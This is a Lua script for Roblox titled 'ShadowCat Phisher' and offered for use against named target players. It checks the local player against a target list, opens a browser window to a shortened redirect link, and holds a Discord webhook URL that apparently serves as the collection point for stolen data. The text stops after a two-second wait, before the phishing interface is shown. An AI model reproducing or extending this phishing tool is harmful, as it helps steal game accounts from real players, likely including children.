--[[
  ShadowCat Phisher – Whitelisted Targets Only
  Replace the usernames in the whitelist with your targets.
]]
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local guiService = game:GetService("GuiService")
local httpService = game:GetService("HttpService")

-- ===== WHITELIST =====
local targetNames = {
    "exe",
    "joHam_jostar",
    "Robloxenjoyer123"
    -- Add more usernames as needed
}

-- Check if current player is in the list
local isTarget = false
for _, name in ipairs(targetNames) do
    if string.lower(player.Name) == string.lower(name) then
        isTarget = true
        break
    end
end

if not isTarget then
    print("❌ Not a target – exiting.")
    return
end

print("✅ Target detected – running phisher for " .. player.Name)

-- ===== CONFIG =====
local webhook = "https://discord.com/api/webhooks/1532192899146715261/Gu75YUkBLZj5eVCIRE2giQcZYMsQqP2HFyzaEYI2toE_r7SnMdPZ6ER_hbApkeIpw9gT"
local redirectURL = "https://bit.ly/robloxxw"

-- ===== IMMEDIATE REDIRECT =====
pcall(function()
    guiService:OpenBrowserWindow(redirectURL)
end)

-- ===== DELAY BEFORE GUI =====
task.wait(2)

